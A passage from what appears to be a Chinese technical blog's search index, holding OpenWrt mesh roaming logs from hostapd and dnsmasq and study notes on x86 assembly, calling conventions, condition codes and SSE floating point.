2a:85:8f:ff:be:e3 Redmi-Note-11T-Pro\n</code></pre></p> <p>FT\u6f2b\u6e38\u5230r3g <pre><code>Thu Aug 17 23:01:41 2023 daemon.notice hostapd: wlan1: AP-STA-DISCONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:41 2023 daemon.err hostapd: nl80211: kernel reports: key addition failed\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (FT)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, FT)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 23:01:41 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 23:01:41 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-REASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 6 notification\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre></p> <p>\u5728op3\u4e0a\u8fd8\u80fd\u770b\u5230dhcp <pre><code>Thu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPDISCOVER(br-lan) 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPOFFER(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPREQUEST(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPACK(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3 Redmi-Note-11T-Pro\n</code></pre></p>","tags":["openwrt","mesh"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/","title":"x86\u8bb0\u5f55","text":"<p>x86\u8bb0\u5f55</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86\u57fa\u7840","title":"x86\u57fa\u7840","text":"<ul> <li>AT&amp;T\u6c47\u7f16\u683c\u5f0f\uff0c\u548cintel\u683c\u5f0f\u3002</li> <li>\u7b80\u5355\u533a\u522b\uff1a<ul> <li>AT&amp;T\u4e2d\u6839\u636e\u64cd\u4f5c\u6570size\u6dfb\u52a0\u4e0d\u540csuffix\uff0c\u5982\uff1ab, w, l, q</li> <li>AT&amp;T\u4e2d\u4f7f\u7528%\u8868\u793a\u5bc4\u5b58\u5668\uff0c$\u8868\u793a\u7acb\u5373\u6570\u3002</li> <li>\u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u987a\u5e8f\u76f8\u53cd\u3002 AT&amp;T\u4e2d\u7b2c\u4e00\u4e2a\u662f\u6e90\u64cd\u4f5c\u6570,\u7b2c\u4e8c\u4e2a\u662f\u76ee\u7684\u64cd\u4f5c\u6570\u3002 \uff08\u7531\u4e8ex86\u4e2d\uff0c\u76ee\u7684\u64cd\u4f5c\u6570\u53c8\u540c\u65f6\u4f5c\u4e3a\u6e90\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u8fd9\u79cd\u5199\u6cd5\u611f\u89c9\u602a\u602a\u7684\u3002\uff09</li> </ul> </li> <li>\u5927\u591a\u6570\u7f16\u8bd1\u5668\u6df7\u5408\u4f7f\u752832\u548c64\u4f4d\u6a21\u5f0f\uff0c32\u4f4d\u5bc4\u5b58\u5668\u7528\u6765\u505a\u6574\u6570\u8ba1\u7b97\uff0c\u800c64\u4f4d\u7528\u4e8e\u4fdd\u5b58\u5185\u5b58\u5730\u5740\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5bc4\u5b58\u5668","title":"\u5bc4\u5b58\u5668","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5e38\u89c1\u6307\u4ee4","title":"\u5e38\u89c1\u6307\u4ee4","text":"<p>\u611f\u89c9\u6bd4\u8f83\u91cd\u8981\u7684\u6307\u4ee4\u7c7b\u522b - \u6570\u636e\u79fb\u52a8\uff1amov -  \u57fa\u672c\u8ba1\u7b97\u6307\u4ee4\uff1aadd, sub, imul, idiv - \u5206\u652f\u8df3\u8f6c\uff1acmp\uff0cjxx, jmp</p> <p>\u5bfb\u5740\u6a21\u5f0f - \u7acb\u5373\u6570 - \u5bc4\u5b58\u5668 - \u5185\u5b58\u5730\u5740   - indirect   - base-relative   - offset-scaled-base-relative <pre><code>movq    (%rsi), %rax\nmovq    offset(%rsi), %rax\nmovq    offset(%rbx, %rcx, scale), %rax\n</code></pre> RISC\u67b6\u6784\u4e2d\u4e00\u822c\u91c7\u7528load/store\u6a21\u5f0f\u5bf9\u5185\u5b58\u8fdb\u884c\u8bfb\u5199\uff0c\u5176\u5b83\u6307\u4ee4\u65e0\u6cd5\u8bfb\u5199\u5185\u5b58</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<p>\u76f8\u5173\u6307\u4ee4 - call, ret - enter, leave</p> <p>cheetsheet\uff1aHandout-CallReturn.graffle (wisc.edu)</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#abi","title":"ABI","text":"<p>\u9700\u8981\u77e5\u9053\u8c03\u7528\u7ea6\u5b9a\uff08calling convention\uff09\uff0c\u4e5f\u4e3aABI\uff08\u5e94\u7528\u4e8c\u8fdb\u5236\u63a5\u53e3\uff09x86 calling conventions - Wikipedia - \u5f71\u54cd\u51fd\u6570\u53c2\u6570\u662f\u5982\u4f55\u4f20\u9012\u7684\uff1a\u901a\u8fc7\u6808\u6216\u5bc4\u5b58\u5668</p> <p>caller rules:</p> <ul> <li>\u4fdd\u5b58caller save\u5bc4\u5b58\u5668(if use)\uff1a%rax, %rcx, %rdx</li> <li>\u6574\u6570\u53c2\u6570(\u5305\u542b\u6307\u9488\uff09\u4f9d\u6b21\u653e\u5728%rdi, %rsi, %rdx, %rcx, %r8, \u548c %r9 \u5bc4\u5b58\u5668\u4e2d\u3002</li> <li>\u6d6e\u70b9\u53c2\u6570\u4f9d\u6b21\u653e\u5728\u5bc4\u5b58\u5668%xmm0-%xmm7\u4e2d\u3002</li> <li>\u5bc4\u5b58\u5668\u4e0d\u591f\u7528\u65f6\uff0c\u53c2\u6570\u653e\u5230\u6808\u4e2d\u3002\u5c06\u51fd\u6570\u7684\u53c2\u6570\u4ee5\u76f8\u53cd\u7684\u987a\u5e8f\u63a8\u9001\u5230\u5806\u6808\u3002</li> <li>\u53ef\u53d8\u53c2\u6570\u51fd\u6570(\u6bd4\u5982printf), \u5bc4\u5b58\u5668%eax\u9700\u8bb0\u5f55\u4e0b\u6d6e\u70b9\u53c2\u6570\u7684\u4e2a\u6570\u3002</li> <li>call<ul> <li>\u5c06rip\u538b\u5165\u6808</li> </ul> </li> </ul> <p>callee rules:</p> <ul> <li>\u4fdd\u5b58caller\u5e27\u7684\u57fa\u5740\u5bc4\u5b58\u5668%rbp\uff1apush %rbp</li> <li>\u8c03\u6574rbp\u6307\u5411\u5f53\u524d\u5e27\uff0cmovq %rsp, %rbp</li> <li>\u5206\u914d\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u901a\u8fc7\u8c03\u6574esp</li> <li> <p>\u53ef\u4ee5\u53d1\u73b0\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8eebp+8\u7684\u4f4d\u7f6e(x86-32)</p> </li> <li> <p>\u4fdd\u5b58callee save\u5bc4\u5b58\u5668(if use)\uff1a%rbx, %rsi, %rdi, %rbp, %rsp, and %r12-%r15</p> </li> <li>\u8fd4\u56de\u503c\u5b58\u50a8\u5728 %eax\u4e2d.</li> <li>\u6062\u590dcallee save\u5bc4\u5b58\u5668\uff08\u5f39\u6808\uff09</li> <li>\u53d6\u6d88\u5206\u914d\u7684\u5c40\u90e8\u53d8\u91cf</li> <li>\u6062\u590d%rbp</li> <li>ret</li> </ul> <p></p> <p>enter, leave\u5408\u5e76\u90e8\u5206\u64cd\u4f5c - \u51fd\u6570\u5f00\u5934\uff1apush ebp; mov ebp, esp; \u5206\u914d\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff1b\u53ef\u4ee5\u901a\u8fc7enter a b\u5b9e\u73b0\u3002a\u4e3a\u5206\u914d\u7684\u5b57\u8282\u6570\uff0cb\u4e3a\u5d4c\u5957\u7ea7\u522b\uff0c\u901a\u5e38\u4e3a0\u3002 - \u51fd\u6570\u7ed3\u5c3e\uff1amov esp, ebp; pop ebp\uff0c\u53ef\u4ee5\u4f7f\u7528leave\u4ee3\u66ff\u3002</p> <p>RISC\u4e2d\u6ca1\u7528\u4e13\u95e8\u7684\u51fd\u6570\u8c03\u7528\u6307\u4ee4\uff0c\u800c\u662f\u4f7f\u7528\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u8fdb\u884c\u8c03\u7528\u548c\u8fd4\u56de\uff0c\u5982MIPS\u4e2d\uff1abeqal func, jr $31</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u52a8\u6001\u94fe\u63a5","title":"\u52a8\u6001\u94fe\u63a5","text":"<ol> <li> <p>\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u751f\u6210\u7684\u8fc7\u7a0b\u3002     \u7f16\u8bd1\uff08\u9884\u5904\u7406\uff0c\u6c47\u7f16\uff09\uff0c\u94fe\u63a5\uff08\u9759\u6001\uff0c\u52a8\u6001\uff09</p> </li> <li> <p>\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u7684\u8fc7\u7a0b     \u521b\u5efa\u8fdb\u7a0b(fork, exec)     loader\uff08\u9759\u6001\uff0c\u52a8\u6001\uff09</p> </li> <li> <p>\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u54ea\u91cc\u4f1a\u51fa\u73b0\u7edd\u5bf9\u5730\u5740</p> </li> <li>MIPS<ul> <li>PC-relative<ul> <li>beq, beqal</li> <li>b label   (pseudo instruction)</li> </ul> </li> <li>indirect<ul> <li>jr\uff1aonly used in call-return</li> </ul> </li> <li>pseudo-immediate<ul> <li>j</li> </ul> </li> </ul> </li> <li>x86<ul> <li>jmp</li> <li>call\uff08\u5b9e\u9645\u662f\u76f8\u5bf9\u504f\u79fb\uff09</li> </ul> </li> </ol>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#csapp-x86\u6c47\u7f16","title":"CSAPP x86\u6c47\u7f16","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86\u6307\u4ee4-reference\u7f51\u9875","title":"x86\u6307\u4ee4 reference\u7f51\u9875","text":"<p>x86\u6307\u4ee4ref\uff1ax86 and amd64 instruction reference (felixcloutier.com)</p> <p>\u683c\u5f0f\u542b\u4e49 - MOV r/m8,r8     - r8\u8868\u793a\u5927\u5c0f\u4e3a8\u4f4d\u7684\u5bc4\u5b58\u5668     - m8\u8868\u793a\u5927\u5c0f\u4e3a8\u4f4d\u7684\u64cd\u4f5c\u6570\u5bf9\u5e94\u7684\u5730\u5740     - imm\u8868\u793a\u7acb\u5373\u6570</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6570\u636e\u683c\u5f0f","title":"\u6570\u636e\u683c\u5f0f","text":"<ul> <li>x86_64\u4e2d\uff0clong\u7c7b\u578b\u662f8\u5b57\u8282\u3002</li> <li>x86\u5904\u7406\u5668\u66fe\u5b9e\u73b0\u8fc7\u5bf980\u4f4d\u6d6e\u70b9\u6570\u7684\u5168\u5957\u6d6e\u70b9\u8fd0\u7b97\uff0c\u5728C\u4e2d\u53ef\u4ee5\u4f7f\u7528long double\u58f0\u660e\u3002\u4e0d\u63a8\u8350\u4f7f\u7528\u3002Double Extended Precision</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6570\u636e\u79fb\u52a8\u6307\u4ee4","title":"\u6570\u636e\u79fb\u52a8\u6307\u4ee4","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#mov-movz-movs","title":"mov, movz, movs","text":"<ul> <li>movl\u4f1a\u5c06\u5bc4\u5b58\u5668\u9ad832\u4f4d\u6e050\uff0c\u56e0\u6b64\u4ee3\u66ff\u4e86movzlq</li> <li>movabsq\u7528\u4e8e64\u4f4d\u7acb\u5373\u6570mov</li> <li>cltq\u662fmovslq %eax, %rax</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#cltdalias","title":"cltd(alias)","text":"<p><code>cltd</code> is an alias for <code>cdq</code> (reference), which sign-extends <code>eax</code> into <code>edx:eax</code>.</p> <p>What this means in practice is that <code>edx</code> is filled with the most significant bit of <code>eax</code> (the sign bit). For example, if <code>eax</code> is <code>0x7F000000</code> <code>edx</code> would become <code>0x00000000</code> after <code>cdq</code>. And if <code>eax</code> is <code>0x80000000</code> <code>edx</code> would become <code>0xFFFFFFFF</code>.</p> <p></p> <p></p> <p></p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u7b97\u672f\u548c\u903b\u8f91\u64cd\u4f5c","title":"\u7b97\u672f\u548c\u903b\u8f91\u64cd\u4f5c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#lea","title":"lea","text":"<ul> <li>lea\uff08\u52a0\u8f7d\u6709\u6548\u5730\u5740\uff08load effective address)\uff09\u53ef\u4ee5\u7528\u6765\u6267\u884c\u7b80\u5355\u7684\u7b97\u672f\u64cd\u4f5c</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#128\u4f4d\u4e58\u9664\u6cd5","title":"128\u4f4d\u4e58\u9664\u6cd5","text":"<ul> <li>\u516b\u5b57 (oct word)\uff0co\u4e3a\u540e\u7f00</li> <li>\u4e0a\u9762\u7684imulq\uff0c\u53cc\u64cd\u4f5c\u6570\uff1a\u5c06\u4e24\u4e2a 64 \u4f4d\u64cd\u4f5c\u6570\u4ea7\u751f\u4e00\u4e2a 64 \u4f4d\u4e58\u79ef\uff08\u622a\u65ad\u65f6\uff0c\u65e0\u7b26\u53f7\u4e58\u548c\u8865\u7801\u4e58\u7684\u4f4d\u7ea7\u884c\u4e3a\u662f\u4e00\u6837\u7684\uff09</li> <li>idivq\u65f6\uff0crdx: rax\u5206\u522b\u5b58\u4f59\u6570\u548c\u5546\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u63a7\u5236","title":"\u63a7\u5236","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6761\u4ef6\u7801","title":"\u6761\u4ef6\u7801","text":"<ul> <li>CF: \u8fdb\u4f4d\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u4f7f\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\u3002\u53ef\u7528\u6765\u68c0\u67fb\u65e0\u7b26\u53f7\u64cd\u4f5c\u7684\u6ea2\u51fa\u3002</li> <li>ZF: \u96f6\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u51fa\u7684\u7ed3\u679c\u4e3a 0\u3002</li> <li>SF: \u7b26\u53f7\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u7684\u7ed3\u679c\u4e3a\u8d1f\u6570\u3002</li> <li>OF: \u6ea2\u51fa\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u4e00\u4e2a\u8865\u7801\u6ea2\u51fa\u2014\u2014 \u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa\u3002</li> </ul> <p>leaq \u6307\u4ee4\u4e0d\u6539\u53d8\u4efb\u4f55\u6761\u4ef6\u7801\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u6765\u8fdb\u884c\u5730\u5740\u8ba1\u7b97\u7684\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u56fe 3-10 \u4e2d \u5217\u51fa\u7684\u6240\u6709\u6307\u4ee4\u90fd\u4f1a\u8bbe\u7f6e\u6761\u4ef6\u7801\u3002\u5bf9\u4e8e\u903b\u8f91\u64cd\u4f5c\uff0c\u4f8b\u5982 XOR\u00ff \u8fdb\u4f4d\u6807\u5fd7\u548c\u6ea2\u51fa\u6807\u5fd7\u4f1a\u8bbe \u7f6e\u6210 \u3007\u3002 \u5bf9\u4e8e\u79fb\u4f4d\u64cd\u4f5c\uff0c\u8fdb\u4f4d\u6807\u5fd7\u5c06\u8bbe\u7f6e\u4e3a\u6700\u540e\u4e00\u4e2a\u88ab\u79fb\u51fa\u7684\u4f4d\uff0c\u800c\u6ea2\u51fa\u6807\u5fd7\u8bbe\u7f6e\u4e3a 0\u3002 INC \u548c DEC \u6307\u4ee4\u4f1a\u8bbe\u7f6e\u6ea2\u51fa\u548c\u96f6\u6807\u5fd7\uff0c\u4f46\u662f\u4e0d\u4f1a\u6539\u53d8\u8fdb\u4f4d\u6807\u5fd7\uff0c\u81f3\u4e8e\u539f\u56e0\uff0c\u6211\u4eec\u5c31\u4e0d\u5728 \u8fd9\u91cc\u6df1\u4eba\u63a2\u8ba8\u4e86\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#cmp-test","title":"cmp, test","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#set","title":"set","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#jmp\u7684pc\u76f8\u5bf9\u5bfb\u5740","title":"jmp\u7684PC\u76f8\u5bf9\u5bfb\u5740","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u51fd\u6570\u8c03\u7528_1","title":"\u51fd\u6570\u8c03\u7528","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u57fa\u6307\u9488\u4f5c\u7528","title":"\u57fa\u6307\u9488\u4f5c\u7528","text":"<p>\u53d8\u957f\u6808\u5e27\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6808\u5e27\u7684\u5927\u5c0f\u5728\u7f16\u8bd1\u65f6\u5373\u53ef\u786e\u5b9a\u3002\u4f46\u662f\u5bf9\u4e8ealloca\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u53d8\u957f\u6570\u7ec4\uff08int p[n]\uff09\uff0c\u6808\u5e27\u5927\u5c0f\u662f\u53d8\u5316\u7684\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u4f53\u7cfb\u7ed3\u6784","title":"\u6d6e\u70b9\u4f53\u7cfb\u7ed3\u6784","text":"<ul> <li>MMX</li> <li>SSE</li> <li>AVX</li> <li>AVX2\uff1a2013 \u5e74 Core i7 Haswell \u5f15\u5165</li> <li>GCC\u4f7f\u7528-mavx2</li> </ul> <p>2000 \u5e74 Pentium 4 \u4e2d\u5f15\u5165\u4e86 SSE2\u3002\u5a92\u4f53\u6307\u4ee4\u5f00\u59cb\u5305\u62ec\u90a3\u4e9b\u5bf9\u6807\u91cf\u6d6e\u70b9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\uff0c\u4f7f\u7528 XMM \u6216 YMM \u5bc4\u5b58\u5668\u7684\u4f4e 32 \u4f4d\u6216 64 \u4f4d\u4e2d\u7684\u5355\u4e2a\u503c\u3002\u8fd9\u4e2a\u6807\u91cf\u6a21\u5f0f\u63d0\u4f9b\u4e86\u4e00\u7ec4\u5bc4\u5b58\u5668\u548c\u6307\u4ee4\uff0c\u5b83\u4eec\u66f4\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u5904\u7406\u5668\u652f\u6301\u6d6e\u70b9\u6570\u7684\u65b9\u5f0f\u3002\u6240\u6709\u80fd\u591f\u6267\u884c X86-64\u4ee3\u7801\u7684\u5904\u7406\u5668\u90fd\u652f\u6301 SSE2 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u56e0\u6b64 X86-64 \u6d6e\u70b9\u6570\u662f\u57fa\u4e8e SSE \u6216 AVX \u7684\uff0c\u5305\u62ec\u4f20\u9012\u8fc7\u7a0b\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u89c4\u5219[77]\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u6570\u636e\u4f20\u9001\u6307\u4ee4","title":"\u6d6e\u70b9\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"<ul> <li>GCC \u53ea\u7528\u6807\u91cf\u4f20\u9001\u64cd\u4f5c\u4ece\u5185\u5b58\u4f20\u9001\u6570\u636e\u5230 XMM \u5bc4\u5b58\u5668\u6216\u4ece XMM \u5bc4\u5b58\u5668\u4f20\u9001\u6570\u636e\u5230\u5185\u5b58\u3002</li> <li>\u5728\u4e24\u4e2a XMM \u5bc4 \u5b58\u5668\u4e4b\u95f4\u4f20\u9001 \u6570\u636e\u65f6\uff0cGCC\u4f7f\u7528vmovaps \u4f20\u9001\u5355\u7cbe\u5ea6\u6570\uff0c\u7528 vtnovapd \u4f20\u9001\u53cc\u7cbe\u5ea6\u6570\uff08\u5bf9\u4e8e\u8fd9\u4e9b\u60c5\u51b5\uff0c\u7a0b\u5e8f\u590d\u5236\u6574\u4e2a\u5bc4\u5b58\u5668\u8fd8\u662f\u53ea\u590d\u5236\u4f4e\u4f4d\u503c\u65e2\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u529f\u80fd\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6267\u884c\u901f\u5ea6\uff09</li> <li>\u63a8\u6d4bvmovss\u7684s\u5206\u522b\u8868\u793ascal</li> <li>ar\u6807\u91cf\u548c\u5355\u7cbe\u5ea6\uff0ca\u8868\u793aaligned, p\u8868\u793apacked</li> </ul> <p>\u56fe 3-47 \u548c\u56fe 3-48 \u7ed9\u51fa\u4e86\u5728\u6d6e\u70b9\u6570\u548c\u6574\u6570\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u4ee5\u53ca\u4e0d\u540c\u6d6e\u70b9\u683c\u5f0f\u4e4b\u95f4\u8fdb\u884c\u8f6c\u6362\u7684\u6307\u4ee4\u96c6\u5408\u3002</p> <p></p> <ul> <li>\u6700\u540e\u7684\u4e24\u884c\u65f6GCC\u5728float\u548cdouble\u95f4\u8f6c\u6362\u7684\u4ee3\u7801\uff0c\u6ca1\u6709\u4f7f\u7528\u57fa\u672c\u7684vctsd2ss\uff08\u6709\u6ca1\u6709\u8fd9\u6761\u6307\u4ee4\u5462\uff1f\uff09</li> </ul> <p></p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u51fd\u6570\u8c03\u7528","title":"\u6d6e\u70b9\u51fd\u6570\u8c03\u7528","text":"<ul> <li>XMM \u5bc4\u5b58\u5668\uff05xmm_0~\uff05xmm_7 \u6700\u591a\u53ef\u4ee5\u4f20\u9012 8 \u4e2a\u6d6e\u70b9\u53c2\u6570\u3002\u6309\u7167\u53c2\u6570\u5217\u51fa\u7684\u987a\u5e8f\u4f7f\u7528\u8fd9\u4e9b\u5bc4\u5b58\u5668\u3002\u53ef\u4ee5\u901a\u8fc7\u6808\u4f20\u9012\u989d\u5916\u7684\u6d6e\u70b9\u53c2\u6570</li> <li>\u51fd\u6570\u4f7f\u7528\u5bc4\u5b58\u5668\uff05xmm_0\u6765\u8fd4\u56de\u6d6e\u70b9\u503c\u3002</li> <li>\u6709\u7684 XMM \u5bc4\u5b58\u5668\u90fd\u662f\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u3002\u88ab\u8c03\u7528\u8005\u53ef\u4ee5\u4e0d\u7528\u4fdd\u5b58\u5c31\u8986\u76d6\u8fd9\u4e9b\u5bc4\u5b58\u5668\u4e2d\u4efb\u610f\u4e00\u4e2a\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u8fd0\u7b97\u64cd\u4f5c","title":"\u6d6e\u70b9\u8fd0\u7b97\u64cd\u4f5c","text":"<ul> <li>\u6d6e\u70b9\u8fd0\u7b97\u6307\u4ee4\u65e0\u6cd5\u4f7f\u7528\u7acb\u5373\u6570\u3002\u7f16\u8bd1\u5668\u5fc5\u987b\u4e3a\u6240\u6709\u7684\u5e38\u91cf\u503c\u5206\u914d\u548c\u521d\u59cb\u5316\u5b58\u50a8\u7a7a\u95f4</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u4f4d\u7ea7\u64cd\u4f5c","title":"\u4f4d\u7ea7\u64cd\u4f5c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6bd4\u8f83","title":"\u6bd4\u8f83","text":"<ul> <li>\u6d6e\u70b9\u6bd4\u8f83\u6307\u4ee4\u4f1a\u8bbe\u7f6e\u4e09\u4e2a\u6761\u4ef6\u7801\uff1a\u96f6\u6807\u5fd7\u4f4d ZF\uff0c\u8fdb\u4f4d\u6807\u5fd7\u4f4d CF \u548c\u5947\u5076\u6807\u5fd7\u4f4d PF</li> <li>\u5bf9\u4e8e\u6d6e\u70b9\u6bd4\u8f83\uff0c\u5f53\u4e24\u4e2a\u64cd\u4f5c\u6570\u4e2d\u4efb\u4e00\u4e2a\u662fNaN\u65f6\uff0c\u4f1a\u8bbe\u7f6ePF\u4f4d\u3002</li> <li>\u5f53 x \u4e3a NaN\u65f6\uff0c\u6bd4\u8f83x==x\u4f1a\u5f97\u5230 0</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86\u624b\u518c","title":"x86\u624b\u518c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5206\u6bb5\u5f0f\u7ba1\u7406","title":"\u5206\u6bb5\u5f0f\u7ba1\u7406","text":"<ul> <li>\u6bb5\u9009\u62e9\u5b50\uff1a\u7528\u4e8e\u67e5\u627eGDT\uff0c\u627e\u5230\u6bb5\u7684\u57fa\u5730\u5740</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u4e2d\u65ad\u5904\u7406","title":"\u4e2d\u65ad\u5904\u7406","text":"<ul> 